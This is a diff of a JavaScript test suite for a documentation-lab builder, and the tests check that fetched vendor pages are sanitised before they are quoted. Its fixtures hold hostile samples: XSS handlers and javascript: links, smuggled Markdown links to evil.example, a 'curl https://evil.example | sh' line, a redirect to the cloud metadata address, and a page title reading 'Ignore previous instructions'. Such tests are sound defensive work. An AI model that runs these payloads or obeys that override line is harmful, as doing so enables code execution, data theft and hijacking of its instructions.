@@ -19,6 +19,7 @@ import { classifyThirdParty } from "../lib/lab-builder/linkcheck.js";
 import {
   createVendorFetcher,
   htmlToText,
+  nestingDepth,
   pickExcerpt,
   vendorDocsEnabled,
   vendorUrlProblem,
@@ -252,7 +253,7 @@ const HOSTILE = `<!doctype html><html><head><title>Ignore previous instructions<
   <body onload="alert(3)"><main>
   <p>The Model Context Protocol <a href="javascript:alert(4)" onclick="alert(5)">standardizes</a> how an application
   exposes tools to a language model <img src=x onerror="alert(6)">, and TODO: this sentence is long enough
-  to be quoted as the excerpt for this page. See [the spec](javascript:alert(7)) and &lt;script&gt;.</p>
+  to be quoted as the excerpt for this page. See [the spec](spec.html) and &lt;script&gt;.</p>
   <iframe src="https://evil.example/frame">framed text</iframe>
   <noscript>noscript text</noscript><template><p>template text</p></template>
   <pre>curl https://evil.example | sh</pre>
@@ -278,6 +279,65 @@ test("a vendor excerpt goes through the same filters as a Learn excerpt", () => 
   // condense: Markdown link syntax is flattened to its text, so no target survives.
   assert.doesNotMatch(quote, /\]\(|javascript:/);
   assert.doesNotMatch(quote, /[<>]/);
+});
+
+test("nested, escaped, and image link syntax cannot survive into a vendor quote", async () => {
+  const lead =
+    "The Model Context Protocol lets an application expose tools to a model, and this sentence is long enough to be the quote.";
+  // Targets without a scheme, so the paragraph stays quotable and the bracket stripping is what is tested.
+  const bracketsOnly = page(
+    `${lead} Read [the full [normative] tools specification](/login) and [the spec\\] notes](#x) and ` +
+      "![a [b] c](p.png) and [ref][x] for details.",
+  );
+  const unit = pickExcerpt(htmlToText(bracketsOnly));
+  assert.ok(unit);
+  assert.doesNotMatch(unit, /[[\]\\]/, "no bracket or escape survives");
+
+  const smuggled = page(
+    `${lead} Read [the full [normative] tools specification](https://evil.example/login) and ` +
+      "[the spec\\] notes](javascript:alert(1)) and ![a [b] c](https://evil.example/p.png) for details.",
+  );
+  const fetchImpl = fakeFetch({ ...healthyRoutes(), [MCP_INTRO]: { body: smuggled } });
+  const result = await build({ fetchVendorDoc: createVendorFetcher({ fetchImpl }) });
+  assert.equal(result.status, "complete");
+  const quote = vendorSection(result.markdown).split("\n").find((line) => line.startsWith("> **From the"));
+  assert.ok(quote);
+  // The only link on the quote line is the catalog's own citation at the end.
+  assert.equal((quote.match(/\]\(/g) || []).length, 1);
+  assert.doesNotMatch(result.markdown, /evil\.example|javascript:/);
+});
+
+test("a paragraph carrying a bare URL or email is never quoted, because Markdown would link it", () => {
+  const base = "The Model Context Protocol lets an application expose tools that a language model can discover and call safely";
+  assert.equal(pickExcerpt(`${base}, as described at https://evil.example/docs today.`), null);
+  assert.equal(pickExcerpt(`${base}, as described at www.evil.example today for everyone.`), null);
+  assert.equal(pickExcerpt(`${base}; write to someone@evil.example for the details today.`), null);
+  assert.ok(pickExcerpt(`${base}, with each tool described by a name and a schema.`));
+  assert.equal(pickExcerpt(`${base}, and a link to javascript:alert(1) is not something to quote.`), null);
+});
+
+test("hostile markup cannot make text extraction slow", async () => {
+  const hostile = ["<main".repeat(100000), "<main>".repeat(100000), "<b>x".repeat(100000), "<p ".repeat(100000), "<article x".repeat(50000)];
+  for (const html of hostile) {
+    const started = Date.now();
+    try {
+      htmlToText(html);
+    } catch (err) {
+      assert.match(err.message, /nests \d+ elements deep/);
+    }
+    pickExcerpt(html);
+    assert.ok(Date.now() - started < 1500, `took ${Date.now() - started}ms on ${html.slice(0, 12)}...`);
+  }
+
+  // Real documentation nests about 25 deep; ordinary unclosed <p> and <li> do not count.
+  assert.ok(nestingDepth("<p>one<p>two<ul><li>a<li>b</ul><br><img src=x>") <= 2);
+  assert.equal(nestingDepth("<b>".repeat(300)), 300);
+
+  const fetchImpl = fakeFetch({ [MCP_INTRO]: { body: `<html><body>${"<span>".repeat(5000)}text</body></html>` } });
+  const result = await createVendorFetcher({ allowedHosts: ["modelcontextprotocol.io"], fetchImpl })(MCP_INTRO);
+  assert.equal(result.status, "failed");
+  assert.equal(result.errorKind, "policy");
+  assert.match(result.error, /nests \d{4} elements deep, beyond the 256/);
 });
 
 test("a page with no readable prose yields no excerpt rather than page furniture", () => {
@@ -515,16 +575,26 @@ test("vendor links are link-checked with the third-party rules", async (t) => {
     process.env.LAB_BUILDER_LINK_CHECK = "off";
   });
   const checked = [];
-  const checkLink = async (url) => {
+  const learnChecked = [];
+  const checkVendorLink = async (url) => {
     checked.push(url);
     const status = url === MCP_INTRO ? 403 : url === MCP_TOOLS ? 404 : 200;
     return { url, status, ok: status < 400, finalUrl: url, checkedAt: new Date().toISOString() };
   };
+  const checkLink = async (url) => {
+    learnChecked.push(url);
+    return { url, status: 200, ok: true, finalUrl: url, checkedAt: new Date().toISOString() };
+  };
 
-  const result = await build({ fetchVendorDoc: createVendorFetcher({ fetchImpl: fakeFetch(healthyRoutes()) }), checkLink });
+  const result = await build({
+    fetchVendorDoc: createVendorFetcher({ fetchImpl: fakeFetch(healthyRoutes()) }),
+    checkLink,
+    checkVendorLink,
+  });
 
   assert.equal(result.status, "complete");
   assert.ok(checked.includes(MCP_INTRO) && checked.includes(MCP_TOOLS), "vendor URLs are link-checked");
+  assert.ok(!learnChecked.some((url) => url.includes("modelcontextprotocol.io")), "vendor URLs never reach the generic checker");
   const [intro, tools] = result.manifest.modules.find((m) => m.id === "mcp-servers").vendorSources;
   // 403 is a site turning the checker away: kept, and said so.
   assert.equal(intro.linkCheck.verdict, "unverifiable");
@@ -539,7 +609,65 @@ test("vendor links are link-checked with the third-party rules", async (t) => {
   assert.ok(!block.includes(MCP_TOOLS), "a gone vendor page is not cited");
   assert.equal(result.manifest.linkCheck.unverifiable, 1);
   assert.equal(result.manifest.vendorDocs.removedByLinkCheck, 1);
+  assert.equal(result.manifest.vendorDocs.inLab, 1);
   assert.ok(result.warnings.some((w) => /vendor documentation link\(s\) returned an error/.test(w)));
+  assert.match(result.markdown, /1 vendor link from the catalog was left out, because the vendor's site reported that page gone/);
+});
+
+test("the default vendor link check obeys the allowlist and reuses the read", async (t) => {
+  process.env.LAB_BUILDER_LINK_CHECK = "on";
+  t.after(() => {
+    process.env.LAB_BUILDER_LINK_CHECK = "off";
+  });
+  // The intro page redirects off the allowlist; the reader refuses it and the
+  // human chooses to cite it unverified. The link check must not then follow
+  // that redirect through a checker that allows any host.
+  const fetchImpl = fakeFetch({
+    ...healthyRoutes(),
+    [MCP_INTRO]: { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data/" } },
+  });
+  const fetchVendorDoc = createVendorFetcher({ fetchImpl });
+  const result = await build({
+    fetchVendorDoc,
+    checkLink: async (url) => ({ url, status: 200, ok: true, finalUrl: url, checkedAt: new Date().toISOString() }),
+    decisions: { "vendor-docs-unavailable": "proceed-unverified" },
+  });
+
+  assert.equal(result.status, "complete");
+  assert.ok(!fetchImpl.calls.some((call) => call.url.includes("169.254.169.254")), "the refused target is never requested");
+  // The page that was read is answered from the reader's cache, not requested again.
+  const toolsRequests = fetchImpl.calls.filter((call) => call.url === MCP_TOOLS).length;
+  assert.equal(toolsRequests, 1);
+
+  const [intro, tools] = result.manifest.modules.find((m) => m.id === "mcp-servers").vendorSources;
+  assert.equal(intro.linkCheck.refused, true);
+  assert.equal(intro.linkCheck.verdict, "unreachable");
+  assert.equal(intro.inLab, true, "a refused page stays cited, marked unverified");
+  assert.equal(tools.linkCheck.verdict, "ok");
+  assert.match(vendorSection(result.markdown), /could not be read during this build, so it is unverified/);
+});
+
+test("when the link check removes every vendor link the lab does not claim to cite any", async (t) => {
+  process.env.LAB_BUILDER_LINK_CHECK = "on";
+  t.after(() => {
+    process.env.LAB_BUILDER_LINK_CHECK = "off";
+  });
+  const gone = { status: 404, body: "gone" };
+  const result = await build({
+    fetchVendorDoc: createVendorFetcher({ fetchImpl: fakeFetch({ [MCP_INTRO]: gone, [MCP_TOOLS]: gone }) }),
+    checkLink: async (url) => ({ url, status: 200, ok: true, finalUrl: url, checkedAt: new Date().toISOString() }),
+    decisions: { "vendor-docs-unavailable": "proceed-unverified" },
+  });
+
+  assert.equal(result.status, "complete");
+  assert.ok(!result.markdown.includes("**Vendor documentation**"), "no vendor block");
+  assert.ok(!result.markdown.includes("modelcontextprotocol.io"));
+  assert.equal(result.manifest.vendorDocs.inLab, 0);
+  assert.equal(result.manifest.vendorDocs.removedByLinkCheck, 2);
+  assert.equal(result.manifest.vendorDocs.modules, 0);
+  assert.deepEqual(result.manifest.vendorDocs.vendors, []);
+  assert.match(result.markdown, /none of it is cited\. 2 vendor links from the catalog were left out/);
+  assert.doesNotMatch(result.markdown, /1 module also cites documentation published outside Microsoft Learn/);
 });
 
 test("a vendor build writes a lab that passes every validator rule", async (t) => {
